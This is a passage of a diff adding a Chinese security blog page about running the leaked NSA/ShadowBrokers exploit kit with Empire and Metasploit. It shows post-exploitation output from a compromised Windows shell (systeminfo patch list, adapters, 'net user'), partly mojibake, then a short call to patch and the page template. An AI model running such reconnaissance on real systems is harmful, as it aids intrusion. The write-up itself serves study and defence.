KB3075226</span><br><span class="line">                  [47]: KB3076895</span><br><span class="line">                  [48]: KB3076949</span><br><span class="line">                  [49]: KB3078071</span><br><span class="line">                  [50]: KB3078601</span><br><span class="line">                  [51]: KB3080446</span><br><span class="line">                  [52]: KB3081320</span><br><span class="line">                  [53]: KB3084135</span><br><span class="line">                  [54]: KB3086255</span><br><span class="line">                  [55]: KB3087039</span><br><span class="line">                  [56]: KB3092601</span><br><span class="line">                  [57]: KB3093513</span><br><span class="line">                  [58]: KB3097966</span><br><span class="line">                  [59]: KB3097989</span><br><span class="line">                  [60]: KB3099862</span><br><span class="line">                  [61]: KB3100213</span><br><span class="line">                  [62]: KB3101246</span><br><span class="line">                  [63]: KB3101722</span><br><span class="line">                  [64]: KB3101746</span><br><span class="line">                  [65]: KB3108371</span><br><span class="line">                  [66]: KB3108381</span><br><span class="line">                  [67]: KB3108664</span><br><span class="line">                  [68]: KB3108670</span><br><span class="line">                  [69]: KB3109094</span><br><span class="line">                  [70]: KB3109103</span><br><span class="line">                  [71]: KB3109560</span><br><span class="line">                  [72]: KB3110329</span><br><span class="line">                  [73]: KB3112343</span><br><span class="line">                  [74]: KB3115858</span><br><span class="line">                  [75]: KB3121461</span><br><span class="line">                  [76]: KB3122648</span><br><span class="line">                  [77]: KB3123479</span><br><span class="line">                  [78]: KB3124280</span><br><span class="line">                  [79]: KB3126446</span><br><span class="line">                  [80]: KB3126587</span><br><span class="line">                  [81]: KB3127220</span><br><span class="line">                  [82]: KB3135983</span><br><span class="line">                  [83]: KB3138612</span><br><span class="line">                  [84]: KB3138910</span><br><span class="line">                  [85]: KB3138962</span><br><span class="line">                  [86]: KB3139398</span><br><span class="line">                  [87]: KB3139914</span><br><span class="line">                  [88]: KB3139940</span><br><span class="line">                  [89]: KB3140735</span><br><span class="line">                  [90]: KB3142024</span><br><span class="line">                  [91]: KB3142042</span><br><span class="line">                  [92]: KB3145739</span><br><span class="line">                  [93]: KB3146706</span><br><span class="line">                  [94]: KB3146963</span><br><span class="line">                  [95]: KB3149090</span><br><span class="line">                  [96]: KB3153171</span><br><span class="line">                  [97]: KB3153199</span><br><span class="line">                  [98]: KB3153731</span><br><span class="line">                  [99]: KB3155178</span><br><span class="line">                  [100]: KB3156013</span><br><span class="line">                  [101]: KB3156016</span><br><span class="line">                  [102]: KB3156017</span><br><span class="line">                  [103]: KB3156019</span><br><span class="line">                  [104]: KB3159398</span><br><span class="line">                  [105]: KB3161561</span><br><span class="line">                  [106]: KB3161949</span><br><span class="line">                  [107]: KB3161958</span><br><span class="line">                  [108]: KB3163245</span><br><span class="line">                  [109]: KB3164033</span><br><span class="line">                  [110]: KB3164035</span><br><span class="line">                  [111]: KB3170455</span><br><span class="line">                  [112]: KB3177186</span><br><span class="line">                  [113]: KB3178034</span><br><span class="line">                  [114]: KB3184122</span><br><span class="line">                  [115]: KB3185911</span><br><span class="line">                  [116]: KB3188730</span><br><span class="line">                  [117]: KB3192391</span><br><span class="line">                  [118]: KB3205394</span><br><span class="line">                  [119]: KB3210131</span><br><span class="line">                  [120]: KB3212642</span><br><span class="line">                  [121]: KB4012204</span><br><span class="line">                  [122]: KB4014565</span><br><span class="line">                  [123]: KB4014661</span><br><span class="line">                  [124]: KB4015546</span><br><span class="line">����:             ��װ�� 4 �� NIC��</span><br><span class="line">                  [01]: Qualcomm Atheros AR9485WB-EG Wireless Network Adapter</span><br><span class="line">                      ������:      �����������</span><br><span class="line">                      ���� DHCP:   �</span><br><span class="line">                      DHCP ������: 192.168.31.1</span><br><span class="line">                      IP ��ַ</span><br><span class="line">                        [01]: 192.168.31.252</span><br><span class="line">                        [02]: fe80::5d70:a440:294c:b455</span><br><span class="line">                  [02]: Realtek PCIe GBE Family Controller</span><br><span class="line">                      ������:      �������</span><br><span class="line">                      ״̬:        ý���������ж</span><br><span class="line">                  [03]: Microsoft Virtual WiFi Miniport Adapter</span><br><span class="line">                      ������:      ������������ 2</span><br><span class="line">                      ״̬:        ý���������ж</span><br><span class="line">                  [04]: VPN Client Adapter - VPN</span><br><span class="line">                      ������:      VPN - VPN Client</span><br><span class="line">                      ״̬:        ý���������ж</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">\\ ���û��ʻ�</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    </span><br><span class="line">�����������ϣ�������һ�����������</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>建议尽快升级系统或者关闭相关服务来缓解NSA工具集带来的冲击,BTW，我主要用的PC是GNU/Linux并不用Windows．</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/embpgp.github.io/tags/exploit/" rel="tag"># exploit</a>
+              <a href="/embpgp.github.io/tags/shellcode/" rel="tag"># shellcode</a>
+              <a href="/embpgp.github.io/tags/NSA/" rel="tag"># NSA</a>
+              <a href="/embpgp.github.io/tags/msf/" rel="tag"># msf</a>
+              <a href="/embpgp.github.io/tags/shadowbroker/" rel="tag"># shadowbroker</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/embpgp.github.io/2017/03/18/Leet%E4%BD%93%E9%AA%8C/" rel="prev" title="Leet体验">
+      <i class="fa fa-chevron-left"></i> Leet体验
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/embpgp.github.io/2017/08/04/gentoo-install/" rel="next" title="gentoo_install">
+      gentoo_install <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">搭建环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B7%91%E8%B5%B7%E6%9D%A5"><span class="nav-number">2.</span> <span class="nav-text">跑起来</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%B9fb-py"><span class="nav-number">2.1.</span> <span class="nav-text">改fb.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%91Empire"><span class="nav-number">2.2.</span> <span class="nav-text">跑Empire</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%91msf"><span class="nav-number">2.3.</span> <span class="nav-text">跑msf</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="rutk1t0r"
+      src="/embpgp.github.io/images/avatar.png">
+  <p class="site-author-name" itemprop="name">rutk1t0r</p>
+  <div class="site-description" itemprop="description">gnireenigne 0x41414141 \xff\xe4\xcc</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/embpgp.github.io/archives/">
+        
+          <span class="site-state-item-count">39</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/embpgp.github.io/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/embpgp.github.io/tags/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/embpgp" title="Github → https:&#x2F;&#x2F;github.com&#x2F;embpgp" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>Github</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/rutk1t0r" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;rutk1t0r" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.hicoder.cn/" title="http:&#x2F;&#x2F;www.hicoder.cn" rel="noopener" target="_blank">Yuan</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.cnblogs.com/fangyz" title="http:&#x2F;&#x2F;www.cnblogs.com&#x2F;fangyz" rel="noopener" target="_blank">Fangyz</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://watch0.top/" title="http:&#x2F;&#x2F;watch0.top" rel="noopener" target="_blank">w@tch0</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rutk1t0r</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">Symbols count total: </span>
+    <span title="Symbols count total">149k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">Reading time total &asymp;</span>
+    <span title="Reading time total">2:16</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/embpgp.github.io/lib/anime.min.js"></script>
+  <script src="/embpgp.github.io/lib/velocity/velocity.min.js"></script>
+  <script src="/embpgp.github.io/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/embpgp.github.io/js/utils.js"></script>
+
+<script src="/embpgp.github.io/js/motion.js"></script>
+
+
+<script src="/embpgp.github.io/js/schemes/pisces.js"></script>
+
+
+<script src="/embpgp.github.io/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/embpgp.github.io/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
